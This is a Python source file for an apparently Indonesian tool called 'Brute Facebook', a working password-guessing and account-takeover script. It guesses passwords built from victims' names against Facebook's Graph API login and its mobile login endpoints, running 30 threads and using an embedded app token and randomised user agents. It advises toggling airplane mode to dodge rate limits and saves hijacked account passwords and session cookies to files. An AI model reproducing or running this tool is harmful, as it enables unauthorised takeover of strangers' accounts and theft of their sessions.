#######################################################
# Name           : Brute Facebook (BF)                #
# File           : ahh.py                             #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 0.4                                #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, re, random, datetime, time, os, base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from concurrent.futures import ThreadPoolExecutor as Modol
from datetime import datetime
from yz.apk import Memek_kuda
from yz.cek import Cek_has
#---- MODULE RICH IN PYTHON -------
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.tree import Tree
# --- BULAN --------
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ha = current.day
op = bulan[nTemp]
ta = current.year
#------------------------------->
M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
H = '\x1b[1;92m' # HIJAU
N = '\x1b[0m'    # WARNA MATI
#------------------------------->
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
biru_m = '[bold cyan]'
kuning = '[#FFFF00]'
###########################################################################################

class Brute_crack:

    def __init__(self, oz):
        self.iya, self.pwa, self.wa, self.tol, self.ses = [], [], [], Console(), requests.Session()
        self.idd, self.apk, self.met, self.cp, self.ok, self.loop = [], [], [], [], [], 0
        self.idd = oz
        self.ua_mu()
        self.tampilkan_apk()
        self.plerr()

    def uass_tod(self):
        rc = random.choice
        rr = random.randint
        verr = rc(["5.1","6.0.1","7.0","7.1.2","8.0.1","9","10","11","12","13"])
        verrr = rc([f"Version/{str(rr(2,4))}.0 Chrome/{str(rr(10,105))}.0.{str(rr(1000,5500))}.{str(rr(45,250))}",f"Chrome/{str(rr(10,105))}.0.{str(rr(1000,5500))}.{str(rr(45,250))}"])
        return f"Mozilla/5.0 (Linux; U; Android {verr}; Pixel C Build/NME91E) AppleWebKit/603.15 (KHTML, like Gecko) {verrr} Mobile Safari/601.0"

    def uass_api(self):
        rr = random.randint
        return (f"Dalvik/2.1.0 (Android {str(rr(9, 15))}; L-03K Build/PKQ1.190522.001) [FBAN/MessengerLite;FBAV/141.0.0.2.117;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/293513921;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/L-03K;FBSV/9;FBCA")

    # ------- HAPUS UA --------
    def hapus_ua(self):
        try:os.remove("assets/ua_xx.txt")
        except:pass
    # ------- SETTING USER AGENT --------
    def ua_mu(self):
        prints(Panel(f"[{biru_m}?{hapus}] gunakan user agent sendiri ([bold yellow]tidak di sarankan[/]) ([bold green]y[/]/[bold red]t[/])", padding=(0,2), style="bold white", width=70, title=f'{merah}•{kuning}•{hijau}•{hijau} USERAGENT {hijau}•{kuning}•{merah}•{hapus}'))
        ua = input(f"[{M}?{N}] pilih: ")
        if ua in [" ", ""]:
            prints(Panel(f"[[bold red![/]] jangan kosong", style="bold white", width=70));self.ua_mu()
        elif ua in ["Y", "y"]:
            self.hapus_ua()
            xx = input(f"[{M}?{N}] masukan user agent: ")
            with open("assets/ua_xx.txt", "a", encoding="utf-8") as w:
                w.write(xx)
            prints(Panel(f"anda menggunakan user agent: [bold green]{xx}", style="bold white", width=70))
        elif ua in ["T", "t"]:
            self.hapus_ua()
            prints(Panel(f"[{biru_m}!{hapus}] anda menggunakan user agent bawaan script:)", padding=(0,5), style="bold white", width=70))
        else:
            prints(Panel(f"[[bold red![/]] y/t bro", style="bold white", width=70));self.ua_mu()
    # ------- NAMPILKAN APLIKASI --------
    def tampilkan_apk(self):
        prints(Panel(f"[{biru_m}?{hapus}] tampilkan aplikasi terkait ([bold yellow]tidak di sarankan[/]) ([bold green]y[/]/[bold red]t[/])", padding=(0,2), style="bold white", width=70, title=f'{merah}•{kuning}•{hijau}•{hijau} APLIKASI {hijau}•{kuning}•{merah}•{hapus}'))
        crot = input(f"[{M}?{N}] pilih: ")
        if crot in[""]:
            prints(Panel(f"[[bold red![/]] jangan kosong", style="bold white", width=70));self.tampilkan_apk()
        elif crot in["Y","y"]:
            self.apk.append("y")
        elif crot in["T","t"]:
            self.apk.append("t")
        else:
            prints(Panel(f"[[bold red![/]] y/t bro", style="bold white", width=70));self.tampilkan_apk()
    # ------- METODE --------
    def mentod(self):
        urut = []
        urut.append(Panel(f"[{biru_m}01{hapus}] method API (fast)\n[{biru_m}02{hapus}] method mbasic (slow)\n[{biru_m}03{hapus}] method mobile (super slow)",title=f'{merah}•{kuning}•{hijau}•{hijau} VALIDATE {hijau}•{kuning}•{merah}•{hapus}',padding=(0,1), style="bold white"))
        urut.append(Panel(f"[{biru_m}04{hapus}] method API (fast)\n[{biru_m}05{hapus}] method mbasic (slow)\n[{biru_m}06{hapus}] method mobile (super slow) ",title=f'{merah}•{kuning}•{hijau}•{hijau} REGGULAR {hijau}•{kuning}•{merah}•{hapus}',padding=(0,0), style="bold white"))
        self.tol.print(Columns(urut))
    # ------- UA RANDOM ----------------
    def kentod(self, integer):
        lis = list("1234567890")
        gets = [random.choice(lis) for _ in range(integer)]
        return "".join(gets).upper()
    # ------- INGFO --------
    def ingfo(self):
        urut = []
        prints(Panel("      [[bold green] Hasil crack akan di simpan di dalam folder results[/] ]", padding=(0,1), style="bold white", width=70))
        urut.append(Panel(f"Hasil [bold green]OK-{ha}-{op}-{ta}.txt[/]",padding=(0,1),style="bold white"))
        urut.append(Panel(f"Hasil [bold yellow]CP-{ha}-{op}-{ta}.txt[/] ",padding=(0,1),style="bold white"))
        self.tol.print(Columns(urut))
        prints(Panel("[italic green]Proses Crack Sedang Berjalan, Mainkan Mode Pesawat Setiap 200 ID!", style="bold white", width=70))
    # ------- PILIH PASSWORD --------
    def plerr(self):
        self.wa.append(Panel.fit(f"[{biru_m}1[/]] pass manual", padding=(0,2), style="bold white"))
        self.wa.append(Panel.fit(f"[{biru_m}2[/]] pass gabung ", padding=(0,2), style="bold white"))
        self.wa.append(Panel.fit(f"[{biru_m}3[/]] pass otomatis", padding=(0,3), style="bold white"))
        self.tol.print(Columns(self.wa))
        ___yayanganteng___ = input(f"[{O}?{N}] pilih: ")
        if ___yayanganteng___ in ["1","01"]:
            prints(Panel(f' [[bold cyan]![/]] kata sandi minimal 6 karakter, gunakan "[bold yellow],[/]" ([bold yellow]koma[/]) untuk kata sandi berikut nya', padding=(0,1), style="bold white", width=70))
            while True:
                pwek = input(f"[{O}?{N}] sandi : ")
                if pwek in[""," "]:
                    print(f"[{M}×{N}] jangan kosong bro kata sandi nya")
                elif len(pwek)<=5:
                    print(f"[{M}×{N}] kata sandi minimal 6 karakter")
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        global prog,des
                        cin = input(f"  [{O}*{N}] method : ")
                        if cin in[""," "]:
                            print(f"  {N}[{M}×{N}] jangan kosong bro");__yan__()
                        elif cin in["1","01"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.validate, kimochi, ysc, "free.facebook.com")
                                        except:pass
                            Cek_has().hasil(self.ok, self.cp)
                        elif cin in["2","02"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.validate, kimochi, ysc, "mbasic.facebook.com")
                                        except:pass
                            Cek_has().hasil(self.ok, self.cp)
                        elif cin in["3","03"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.validate, kimochi, ysc, "m.facebook.com")
                                        except:pass
                            Cek_has().hasil(self.ok, self.cp)
                        elif cin in["4","04"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.reguller, kimochi, ysc)
                                        except:pass
                            Cek_has().hasil(self.ok, self.cp)
                        elif cin in["5","05"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.reguller, kimochi, ysc, "mbasic.facebook.com")
                                        except:pass
                            Cek_has().hasil(self.ok, self.cp)
                        elif cin in["6","06"]:
                            self.ingfo()
                            prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
                            des = prog.add_task('',total=len(self.idd))
                            with prog:
                                with Modol(max_workers=30) as bool:
                                    for i in self.idd:
                                        try:
                                            kimochi = i.split('<=>')[0]
                                            bool.submit(self.reguller, kimochi, ysc, "m.facebook.com")
                                        except:pass
                            Cek_has().hasil(self.ok, self.cp)
                        else:
                            print(f"  {N}[{M}!{N}] input yang bener");__yan__()
                    prints(Panel(f"crack dengan sandi -> [ {merah}{pwek} [/]]", style="bold white", width=70))
                    self.mentod()
                    __yan__(pwek.split(","))
                    break
        elif ___yayanganteng___ in ["2","02"]:
            self.iya.append("ya")
            prints(Panel(f' [[bold cyan]![/]] kata sandi minimal 6 karakter, gunakan "[bold yellow],[/]" ([bold yellow]koma[/]) untuk kata sandi berikut nya', padding=(0,1), style="bold white", width=70))
            kata = input(f"[{M}?{N}] sandi: ")
            xxxx = kata.split(",")
            for i in xxxx:
                self.pwa.append(i)
            prints(Panel(f"kata sandi tambahan -> [ {merah}{kata} [/]]", style="bold white", width=70))
            self.mentod()
            self.ykhhhh()
        elif ___yayanganteng___ in ["3","03"]:
            self.mentod()
            self.ykhhhh()
        else:
            print(f"[{M}!{N}] y/t bro");self.plerr()

    ###---[ CONVERT COOKIE ]---###
    def ngoxok(self, cooz):
        coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
        return(str(coki))

    # ------- METODE LOGIN --------
    def Api(self, user, pasw):
        prog.update(des,description=f"{str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                ses=requests.Session()
                try:
                    xxx=open("assets/ua_xx.txt" ,"r").read().splitlines()
                    for i in xxx:
                        uas = i
                except:uas=self.uass_api()
                data = {"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16", "sdk_version": {random.randint(1,26)}, "email": user, "locale": "en_US", "password": pw, "sdk": "android", "generate_session_cookies": "1", "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
                head = {"Host": "graph.facebook.com", "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": uas, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                xnxx = ses.post("https://graph.facebook.com/auth/login", params=data, headers=head, allow_redirects=False).json()
                if "session_key" in xnxx:
                    cokz = ";".join(i["name"]+"="+i["value"] for i in xnxx["session_cookies"])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    coki = f"sb={ssbb};{cokz}"
                    digi = random.choice([2])
                    digi = self.kentod(digi)
                    if "y" in self.apk:
                        Memek_kuda(user, pw, coki, digi)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}")
                        tree.add(f"[bold green]{coki}ua={digi}")
                        prints(tree)
                    wrt = (f" [✓] {user}|{pw}|{coki}")
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "www.facebook.com" in xnxx["error"]["message"]:
                    tree = Tree("")
                    tree.add(f"[bold yellow]{user}|{pw}")
                    prints(tree)
                    wrt = (f" [×] {user}|{pw}")
                    self.cp.append(wrt)
                    with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as w:
                        w.write(wrt+"\n")
                    break
                else:continue
            #except Exception as e:prints(e)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"[[bold red]spam[/]] {str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)

        self.loop+=1

    def validate(self, user, pasw, cebok):
        prog.update(des,description=f"{str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                ses=requests.Session()
                try:
                    xxx=open("assets/ua_xx.txt" ,"r").read().splitlines()
                    for i in xxx:
                        uas = i
                except:uas=self.uass_tod()
                link = ses.get(f"https://{cebok}/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2F{cebok}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
                data = {"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"uid":user,"next": f"https://{cebok}/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
                koki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                koki+=' m_pixel_ratio=2.625; wd=412x756'
                head= {'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://'+cebok,'content-type': 'application/x-www-form-urlencoded','user-agent': uas,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2F'+cebok+'%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                po = ses.post(f'https://{cebok}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=data, cookies={'cookie': koki},headers=head, allow_redirects=False)
                if "c_user" in ses.cookies.get_dict():
                    digi = random.choice([2])
                    digi = self.kentod(digi)
                    coki = self.ngoxok(ses.cookies.get_dict())
                    if "y" in self.apk:
                        Memek_kuda(user, pw, coki, digi)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}")
                        tree.add(f"[bold green]{coki}ua={digi}")
                        prints(tree)
                    wrt = (f" [✓] {user}|{pw}|{coki}")
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree("")
                    tree.add(f"[bold yellow]{user}|{pw}")
                    prints(tree)
                    wrt = (f" [×] {user}|{pw}")
                    self.cp.append(wrt)
                    with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as w:
                        w.write(wrt+"\n")
                    break
                else:continue
            #except Exception as e:prints(e)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"[[bold red]spam[/]] {str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)

        self.loop+=1

    def reguller(self, user, pasw, curl):
        prog.update(des,description=f"{str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
        prog.advance(des)
        for pw in pasw:
            try:
                ses=requests.Session()
                try:
                    xxx=open("assets/ua_xx.txt" ,"r").read().splitlines()
                    for i in xxx:
                        uas = i
                except:uas=self.uass_tod()
                link = ses.get(f"https://{curl}/login/?add_contactpoin/dialog/submit/")
                data = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),"li":re.search('name="li" value="(.*?)"',str(link.text)).group(1),"try_number":re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),"next":"https://"+curl+"/login/save-device/?login_source=account_creation","uid":user,"pass":pw,}
                ders = {'authority':curl,'accept':'*/*','accept-encoding':'gzip,deflate,br','accept-language':'en-gb,id;q=0.9,en-US;q=0.7','connection':'keep-alive','content-type':'application/x-www-form-urlencoded','origin':'https://'+curl,'referer':'https://'+curl+'/login/?add_contactpoin/dialog/submit/','upgrade-insecure-requests':'1','user-agent':uas,'sec-fetch-dest':'document','sec-fetch-mode':'navigate','sec-fetch-site':'none','sec-ch-ua':'"Not A;Brand";v="99","Chromium";v="101","Opera";v="101"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform':'"Linux"','x-requested-with':'XMLHttpRequest.responseURL'}
                xnxx = ses.post(f'https://{curl}/login/device-based/login/async/?refsrc=deprecated&ref=wizard', headers=ders, data=data)
                if "c_user" in ses.cookies.get_dict():
                    digi = random.choice([2])
                    digi = self.kentod(digi)
                    coki = self.ngoxok(ses.cookies.get_dict())
                    if "y" in self.apk:
                        Memek_kuda(user, pw, coki, digi)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(f"[bold green]{user}|{pw}")
                        tree.add(f"[bold green]{coki}ua={digi}")
                        prints(tree)
                    wrt = (f" [✓] {user}|{pw}|{coki}")
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree("")
                    tree.add(f"[bold yellow]{user}|{pw}")
                    prints(tree)
                    wrt = (f" [×] {user}|{pw}")
                    self.cp.append(wrt)
                    with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as w:
                        w.write(wrt+"\n")
                    break
                else:
                    continue
            #except Exception as e:prints(e)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"[[bold red]spam[/]] {str(self.loop)}/{len(self.idd)} OK-:[bold green]{len(self.ok)}[/] CP-:[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)

        self.loop+=1
    # ------- METODE PILIHAN --------
    def ykhhhh(self):
        yan = input(f"[{O}*{N}] method : ")
        if yan in [""," "]:
            print(f"{N}[{M}×{N}] jangan kosong bro");self.ykhhhh()
        elif yan in ["01","1"]:
            self.met.append("free")
        elif yan in ["02","2"]:
            self.met.append("mbasic")
        elif yan in ["03","3"]:
            self.met.append("mobile")
        elif yan in ["04","4"]:
            self.met.append("free_1")
        elif yan in ["05","5"]:
            self.met.append("mbasic_1")
        elif yan in ["06","6"]:
            self.met.append("mobile_1")
        else:
            print(f"{N}[{M}×{N}] input yang bener");self.ykhhhh()
        self.progg()
    # ------- PROGRESS ------------
    def progg(self):
        self.ingfo()
        global prog,des
        prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn("[progress.percentage]{task.percentage:>3.0f}%"))
        des = prog.add_task("",total=len(self.idd))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.idd:
                    uid, nama = user.split("<=>")[0], user.split("<=>")[1].lower()
                    depan = nama.split(" ")[0]
                    if len(nama) <=5:
                        if len(depan) <=1 or len(depan) <=2:pass
                        else:
                            pwx = [depan+"123", depan+"1234", depan+"12345", depan+"321"]
                    else:
                        pwx = [nama, depan+"123", depan+"1234", depan+"12345"]
                    if "ya" in self.iya:
                        for kontol in self.pwa:
                            pwx.append(kontol)
                    if "free" in self.met:
                        bool.submit(self.Api, uid, pwx)
                    elif  "mbasic" in self.met:
                        bool.submit(self.validate, uid, pwx, "mbasic.facebook.com")
                    elif  "mobile" in self.met:
                        bool.submit(self.validate, uid, pwx, "m.facebook.com")
                    elif  "free_1" in self.met:
                        bool.submit(self.Api, uid, pwx)
                    elif  "mbasic_1" in self.met:
                        bool.submit(self.reguller, uid, pwx, "mbasic.facebook.com")
                    elif  "mobile_1" in self.met:
                        bool.submit(self.reguller, uid, pwx, "m.facebook.com")
                    else:
                        bool.submit(self.reguller, uid, pwx, "m.facebook.com")

        Cek_has().hasil(self.ok, self.cp)
